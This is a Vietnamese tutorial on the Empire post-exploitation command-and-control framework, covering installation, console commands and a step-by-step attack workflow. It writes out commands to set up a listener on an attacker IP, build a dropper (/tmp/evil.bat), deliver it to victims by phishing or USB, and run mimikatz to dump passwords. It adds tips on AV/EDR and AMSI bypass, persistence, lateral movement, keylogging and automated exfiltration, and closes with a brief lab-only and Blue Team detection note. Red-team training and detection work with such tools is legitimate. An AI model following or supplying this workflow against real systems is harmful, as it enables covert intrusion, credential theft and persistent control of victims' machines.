1. Empire là gì?

    Empire là một post-exploitation framework (C2) mã nguồn mở cho Red Team, hỗ trợ:

        Tấn công, kiểm soát, duy trì truy cập, automation, sử dụng PowerShell (Windows), Python (Linux/macOS), Mimikatz, Lateral Movement, Persistence, Credential Harvesting, Phishing, File Transfer...

        C2 (Command & Control): Giao tiếp an toàn với nhiều implant (agent) cùng lúc qua HTTP/S, SMB, TCP, nén/evade, bypass AV/EDR, opsec bypass.

        Tích hợp stager (dropper), module (mã độc chức năng), listener (C2 server), evasion, scripting, API.

    Dùng cho:

        Red Team, pentest, CTF, purple team, training, adversary simulation, nghiên cứu AV/EDR bypass, automation attack.

2. Cài đặt Empire (2025) – bản mới nhất của BC-Security
A. Chuẩn bị môi trường

    OS: Kali, Parrot, Ubuntu, Debian, Windows Subsystem for Linux (WSL), macOS.

    Yêu cầu: Python 3.8+, pip, git, virtualenv.

B. Clone & cài đặt

git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
sudo ./setup/install.sh
# Hoặc:
python3 setup.py install

    Note: Nên chạy Empire trong virtualenv hoặc docker cho sạch sẽ, dễ rollback.

C. Khởi động Empire

sudo ./empire

    Giao diện CLI kiểu msfconsole.

3. Giao diện CLI Empire – các lệnh cơ bản
Lệnh chính	Ý nghĩa
listeners	Quản lý listener (C2 server, kênh giao tiếp agent)
agents	Quản lý, tương tác agent/implant đang kết nối
uselistener	Chọn loại listener để tạo (HTTP, HTTPS, SMB, TCP...)
usestager	Tạo stager/dropper (PowerShell, macro, exe, dll...)
usemodule	Module tấn công, post-exploit, persistence...
creds	Xem và trích xuất credential thu thập được
interact	Giao tiếp với agent cụ thể (tên/ID agent)
set <option> <value>	Set option cho listener, stager, module...
execute	Thực thi module/stager/listener/command
run	Giống execute, chạy tác vụ đã chọn
kill	Dừng agent hoặc listener
exit	Thoát framework
4. Workflow cơ bản – tấn công với Empire
A. Tạo listener (C2 server)

listeners
uselistener http
set Host http://<your_ip>:80
set Name mylistener
execute

    Có thể tạo nhiều loại listener: HTTP, HTTPS, SMB, TCP, multiport...

B. Tạo stager/dropper (payload nạp lên máy victim)

usestager windows/launcher_bat
set Listener mylistener
set OutFile /tmp/evil.bat
execute

    Có thể tạo stager PowerShell, .bat, macro Excel/Word, DLL, EXE, Python, One-liner...

    Tùy chọn evade, encode, compress, bypass AV/EDR.

C. Gửi stager cho victim (phishing/email/spear/lure/USB/dính vào macro/exploit...)

    Khi victim chạy stager → sẽ tạo kết nối về listener, hiện agent mới trên Empire.

D. Quản lý agent & điều khiển máy victim

agents
interact <agent_name>
shell whoami
usemodule powershell/credentials/mimikatz/logonpasswords
execute
# ... hoặc dùng mọi module bạn muốn: dump hash, file, pivot, persistence, screenshot, exfil, v.v.

5. Tính năng nâng cao – automation, evade, opsec
A. Bypass AV/EDR, evade detection

    Stager “obfuscated”, multi-encode, bypass (nói rõ trong help từng stager)

    Dùng các module evade, compress, encrypt, AMSI bypass, Antimalware bypass

    Thay đổi giao thức C2, random port, fake user-agent, jitter, sleep, staged/un-staged payload.

B. Lateral Movement, Pivoting, Multi-hop

    Dùng module invoke_psremoting, invoke_wmi, invoke_smbexec, psexec, pivot qua nhiều máy (điều khiển toàn bộ domain)

    Tunnel traffic, chuyển agent từ máy A → B → C, evade detection.

C. Persistence, stealth

    Module registry persistence, scheduled task, service, wmi event, startup, run key…

    Tự động reconnect nếu máy victim reboot, hoặc ngắt kết nối.

D. Credential harvesting & post-exploitation

    Mimikatz, dump hash, tokens, credstore, browser, lsass...

    Kerberos attack (Pass-the-Hash, Pass-the-Ticket, Kerberoasting, DCSync…)

E. Download/upload file, exfil, screenshot, keylog

    Module upload, download, screenshot, keylogger, webcam_snap...

6. Automation & API

    Empire hỗ trợ RESTful API: tích hợp automation với SIEM, C2 farm, automation lab, Red Team Platform...

    Có thể viết script Python gọi API, tự động trigger attack, collect output, phát hiện agent, batch persistence, mass phishing.

    Hỗ trợ CLI automation, gọi lệnh từ file .empire script.

7. OPSEC & Blue Team note

    Empire là C2 chuyên Red Team/Blue Team defense lab, không nên dùng vào mục đích phi pháp.

    Blue Team nên dùng Empire để học detection:

        Theo dõi event log, network C2, Powershell event, AMSI bypass, defense EDR

        Xây dựng rule SIEM, test detection đối với Empire (IOC, yara, rule, proxy log...)

    Nên deploy trên môi trường ảo, lab, honeypot để phòng rủi ro.

8. Mẹo mạnh thực chiến

    Luôn đổi default profile listener (user-agent, URI, delay jitter), dùng HTTPS, opsec cao.

    Kết hợp với Metasploit, Cobalt Strike, Covenant, PoshC2 để đa dạng C2, bypass defense.

    Tận dụng module persistence, auto pivot, enumerate network/domain để mở rộng quyền kiểm soát.

    Test AV/EDR detection bằng stager encode, AMSI bypass, ghi lại IOC!

    Script hóa automation Red Team (chain workflow, auto-report, auto-exfil...).

9. So sánh Empire với các C2 framework khác
Tool	Ưu điểm Empire	Khác biệt
Empire	Post-exploit mạnh, PowerShell, automation, nhiều module, C2 stealth	Không stealth bằng Cobalt Strike, không có GUI xịn
Cobalt Strike	Stealth, pro, workflow mạnh, phổ biến, GUI, opsec	Thương mại, đắt, dễ bị detect IOC
Metasploit	Tấn công exploit mạnh, module nhiều, workflow tốt	Không chuyên post-exploit, không PowerShell-focused
Covenant	C2 .NET, mạnh Windows, automation tốt	Yếu Linux/macOS, ít module hơn Empire
PoshC2	PowerShell C2, opsec tốt, đa nền tảng	Cộng đồng nhỏ hơn, khó config hơn Empire
10. Tài liệu, link hữu ích

    Empire BC-Security (official)

    Empire Documentation

    Hacktricks – C2 Framework

    PayloadAllTheThings – C2

    Covenant C2

    PoshC2

    Cobalt Strike

Tóm tắt nhanh

    Empire: post-exploit & C2 PowerShell/Python cực mạnh cho Red Team, pentest, training blue team, automation attack, credential dump, evade, pivot, persistence, download/upload, full workflow, stealth cao.

    Hỗ trợ automation, REST API, fake AV, evasion, multi-listener, multi-agent, script hóa chuyên nghiệp.

    Nên phối hợp với các C2 khác (Metasploit, Cobalt Strike, Covenant...) để hoàn thiện workflow Red Team hiện đại.

